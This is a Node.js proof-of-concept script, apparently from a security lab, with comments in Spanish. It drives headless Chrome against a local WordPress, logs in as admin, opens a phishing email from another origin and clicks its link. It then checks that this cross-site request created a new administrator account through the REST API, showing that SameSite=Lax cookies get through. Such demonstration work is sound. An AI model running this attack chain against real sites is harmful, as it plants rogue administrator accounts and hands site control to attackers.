#!/usr/bin/env node
/**
 * FASE R — Demo del clic con NAVEGADOR REAL (la afirmación "SameSite=Lax
 * permite el clic", medida y no razonada).
 *
 * Lanza Chrome headless con perfil limpio y reproduce el ataque de punta a
 * punta COMO LO VERÍA LA VÍCTIMA:
 *   1. Login legítimo como admin en :8085 (wp-login.php).
 *   2. Navegación a file://…/correo-phishing.html — OTRO origen.
 *   3. CLICK en el <a> del correo: navegación top-level GET que el navegador
 *      envía con las cookies de sesión (Lax lo permite).
 *   4. Verificación: la respuesta del REST API debe ser 201 (admin creado).
 *
 * Salidas (docs/img/): demo-1-sesion.png, demo-2-correo.png, demo-3-resultado.png.
 *
 * Cero dependencias: CDP por WebSocket nativo (Node >= 22) contra el Chrome
 * del sistema. El usuario a crear es configurable:
 *   node scripts/capturas/demo_navegador.mjs [usuario] [password]
 * (por defecto demo-navegador / demo-navegador-PoC-2026; bórralo con
 *  make reset USUARIO=demo-navegador)
 */
import { spawn } from "node:child_process";
import { mkdirSync, writeFileSync } from "node:fs";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const BASE = process.env.LAB_BASE ?? "http://localhost:8085";
const CHROME =
  process.env.CHROME_BIN ??
  "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const USUARIO = process.argv[2] ?? "demo-navegador";
const CLAVE = process.argv[3] ?? "demo-navegador-PoC-2026";
const CORREO = join(process.cwd(), "exploit", "correo-phishing.html");
const IMG = join(process.cwd(), "docs", "img");
const PUERTO = 9333;

const log = (m) => console.log(`[demo] ${m}`);
const fallar = (m) => {
  console.error(`[demo] ERROR: ${m}`);
  process.exitCode = 1;
};

mkdirSync(IMG, { recursive: true });

// ---------------------------------------------------------------- CDP mínimo
class CDP {
  constructor(ws) {
    this.ws = ws;
    this.id = 0;
    this.pendientes = new Map();
    this.eventos = [];
    this.esperas = [];
    ws.addEventListener("message", (ev) => {
      const msg = JSON.parse(ev.data);
      if (msg.id && this.pendientes.has(msg.id)) {
        const { res, rej } = this.pendientes.get(msg.id);
        this.pendientes.delete(msg.id);
        msg.error ? rej(new Error(msg.error.message)) : res(msg.result);
      } else if (msg.method) {
        this.eventos.push(msg);
        this.esperas = this.esperas.filter((e) => !e(msg));
      }
    });
  }
  send(method, params = {}) {
    const id = ++this.id;
    this.ws.send(JSON.stringify({ id, method, params }));
    return new Promise((res, rej) => this.pendientes.set(id, { res, rej }));
  }
  async esperarEvento(method, timeout = 15000, filtro = () => true) {
    const idx = this.eventos.findIndex((e) => e.method === method && filtro(e));
    if (idx !== -1) return this.eventos.splice(idx, 1)[0];
    return new Promise((res, rej) => {
      const t = setTimeout(() => {
        this.esperas = this.esperas.filter((e) => e !== cb);
        rej(new Error(`timeout esperando ${method}`));
      }, timeout);
      const cb = (msg) => {
        if (msg.method === method && filtro(msg)) {
          clearTimeout(t);
          this.esperas = this.esperas.filter((e) => e !== cb);
          res(msg);
          return true;
        }
        return false;
      };
      this.esperas.push(cb);
    });
  }
}

const dormir = (ms) => new Promise((r) => setTimeout(r, ms));

async function main() {
  log(`Chrome: ${CHROME}`);
  const perfil = mkdtempSync(join(tmpdir(), "demo-chrome-"));
  const chrome = spawn(CHROME, [
    "--headless=new",
    `--remote-debugging-port=${PUERTO}`,
    `--user-data-dir=${perfil}`,
    "--no-first-run",
    "--no-default-browser-check",
    "--disable-gpu",
    "--force-device-scale-factor=2",
    "--window-size=1280,920",
    "--hide-scrollbars",
    "about:blank",
  ]);
  chrome.stderr.on("data", () => {});

  try {
    // esperar al endpoint de depuración
    let diana;
    for (let i = 0; i < 30; i++) {
      try {
        const r = await fetch(`http://127.0.0.1:${PUERTO}/json/list`);
        const lista = await r.json();
        diana = lista.find((t) => t.type === "page");
        if (diana) break;
      } catch {}
      await dormir(500);
    }
    if (!diana) throw new Error("Chrome no expuso el puerto de depuración");

    const ws = new WebSocket(diana.webSocketDebuggerUrl);
    await new Promise((res, rej) => {
      ws.onopen = res;
      ws.onerror = () => rej(new Error("WebSocket CDP falló"));
    });
    const cdp = new CDP(ws);
    await cdp.send("Page.enable");
    await cdp.send("Runtime.enable");
    await cdp.send("Network.enable");

    // ---------------------------------------------------- 1) login de la víctima
    log(`(1/4) login legitimo del admin en ${BASE}`);
    await cdp.send("Page.navigate", { url: `${BASE}/wp-login.php` });
    await cdp.esperarEvento("Page.loadEventFired");
    await cdp.send("Runtime.evaluate", {
      expression: `document.querySelector('#user_login').value = 'admin';
                   document.querySelector('#user_pass').value = 'admin';
                   document.querySelector('#loginform').submit();
                   'ok'`,
    });
    await cdp.esperarEvento("Page.loadEventFired");
    const enPanel = await cdp.send("Runtime.evaluate", {
      expression: "location.pathname.startsWith('/wp-admin') ? 'si' : location.pathname",
    });
    if (enPanel.result.value !== "si") throw new Error("el login no llegó a wp-admin");
    await dormir(800); // dejar terminar assets
    let shot = await cdp.send("Page.captureScreenshot", { format: "png" });
    writeFileSync(join(IMG, "demo-1-sesion.png"), Buffer.from(shot.data, "base64"));
    log("      sesión iniciada -> docs/img/demo-1-sesion.png");

    // ---------------------------------------------- 2) el correo (otro origen)
    log(`(2/4) la víctima abre el correo: file://${CORREO}`);
    await cdp.send("Page.navigate", { url: `file://${CORREO}` });
    await cdp.esperarEvento("Page.loadEventFired");
    await dormir(400);
    shot = await cdp.send("Page.captureScreenshot", { format: "png" });
    writeFileSync(join(IMG, "demo-2-correo.png"), Buffer.from(shot.data, "base64"));
    log("      correo visible  -> docs/img/demo-2-correo.png");

    // --------------------------------- 3) EL CLIC (navegación top-level con Lax)
    log("(3/4) CLICK en el enlace del correo (navegación top-level GET)...");
    // limpiar eventos del dashboard (wp-admin dispara sus propias llamadas REST
    // a /wp/v2/users/me durante la carga: no deben colarse en el matcher)
    cdp.eventos.length = 0;
    const respPromise = cdp.esperarEvento(
      "Network.responseReceived",
      20000,
      (e) =>
        e.params.response.url.includes("/wp-json/wp/v2/users?") &&
        e.params.response.url.includes("_method=POST")
    );
    await cdp.send("Runtime.evaluate", {
      expression: "document.querySelector('.btn') ? (document.querySelector('.btn').click(), 'clic') : 'sin-boton'",
    });
    const ev = await respPromise;
    const status = ev.params.response.status;
    log(`      respuesta del REST API: HTTP ${status}`);
    await cdp.esperarEvento("Page.loadEventFired", 20000).catch(() => {});
    await dormir(600);
    shot = await cdp.send("Page.captureScreenshot", { format: "png" });
    writeFileSync(join(IMG, "demo-3-resultado.png"), Buffer.from(shot.data, "base64"));
    log("      resultado       -> docs/img/demo-3-resultado.png");

    // ---------------------------------------------------------- 4) veredicto
    if (status === 201) {
      console.log(
        `\n[demo] ✔ NAVEGADOR REAL: el clic desde OTRO origen creó el admin ` +
          `"${USUARIO}" (HTTP 201). SameSite=Lax dejo pasar las cookies.`
      );
    } else {
      fallar(`el clic devolvió HTTP ${status} (¿csrfadmin ya existe? usa otro usuario)`);
    }
  } catch (e) {
    fallar(e.message);
  } finally {
    chrome.kill("SIGKILL");
  }
}

await main();
